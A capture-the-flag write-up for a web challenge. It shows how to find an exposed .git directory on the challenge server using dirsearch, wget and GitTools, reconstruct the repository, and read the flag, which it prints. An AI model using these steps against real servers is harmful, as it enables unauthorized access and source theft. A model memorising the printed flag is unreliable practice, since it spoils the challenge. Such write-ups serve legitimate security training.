# Challenge Name:
 [*Maximum Courage*](https://cybertalents.com/challenges/web/maximum-courage)
 
# Challenge Description
Max prefers to learn by practicing and not just reading all day, so he set up a webserver and hopes it stays secret, can you prove it has a weakness?

Link: [http://3.126.138.80/maximum/](http://3.126.138.80/maximum/)

## Answer
* Use Dirsearch tool to bruteforce directory of 'http://3.126.138.80/maximum/' 
```bash
python3 dirsearch.py -u http://3.126.138.80/maximum/
```
* We found an .git folder lets download it using wget
```bash
wget -r http://3.126.138.80/maximum/.git
```
* Use [GitTools](https://github.com/internetwache/GitTools) to extract commits and their content from this broken repository.
```bash
./extractor.sh ~/Desktop/maximum/ ~/Desktop/repo
```
* See flag.php file content
```bash
cat /home/darkknight/Desktop/repo/0-190de370286e98dda6813ac9c05f679ad60d9f9c/flag.php
```
* You got the Flag!!

 ## The Flag
 > be607453caada6a05d00c0ea0057f733
